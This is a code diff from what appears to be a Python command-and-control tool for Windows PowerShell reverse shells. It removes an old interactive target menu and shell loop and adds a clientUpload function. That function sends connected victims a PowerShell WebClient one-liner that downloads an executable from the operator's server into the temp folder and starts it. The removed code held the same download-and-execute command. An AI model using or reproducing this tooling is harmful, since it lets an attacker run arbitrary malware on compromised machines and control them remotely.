@@ -57,50 +57,11 @@ def interactShell(clientconn,clientnumber):
     return True
 
 
-"""
-def startSocket(ipaddr, port):
-    startListener()
-    printListener(ipaddr, port)
-    print "Waiting for clients"
-    while True:
-        for client in clientlist:
-            print str(client['client']) + ': ' +  client['clientaddress']
-            if client:
-                targetchoice = raw_input('Choose target :>')
-        for client in clientlist:
-            if targetchoice == str(client['client']):
-                while client:
-                    menu = raw_input('[u]pload\n[s]hell\n[exit]\n>>')
-                    if menu.lower() == "u":
-                        fileToUpload = raw_input('File to upload:')
-                        FUNCTIONS().DoServe(ipaddr,fileToUpload.split('/')[-1].rstrip('.exe'),os.path.dirname(fileToUpload))
-                        print "$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"Env:TEMP\\temp.exe\");Start-Process \"$Env:TEMP\\temp.exe\""
-                        client['clientinstance'].sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Process \"$Env:TEMP\\temp.exe\"")
-                    elif menu.lower() == "s":
-                        while True:
-                            data = ''
-                            command = raw_input("PS >")
-                            if command == "exit":
-                                break
-                            if command == "":
-                                continue
-                            client['clientinstance'].sendall(command)
-                            a = True
-                            while a:
-                                data += client['clientinstance'].recv(16834).encode("utf-8").replace('\n','')
-                                if data[-1] == "\x00":
-                                    a = False
-                            print data
-                    elif menu.lower() == "exit":
-                        client['clientinstance'].close()
-                        clientlist.remove(client)
-                        print "Closing Connection"
-                        break
-            else:
-                break
-    s.close()
-"""
-
+def clientUpload(fileToUpload,clientconn):
+    print t.bold_green + "[*] Starting Transfer" + t.normal
+    ipaddr = FUNCTIONS().CheckInternet()
+    FUNCTIONS().DoServe(ipaddr,fileToUpload,os.path.dirname(fileToUpload))
+    clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 15;Start-Process \"$Env:TEMP\\temp.exe\"")
 
 def printListener():
     windows_ps_rev_shell = (
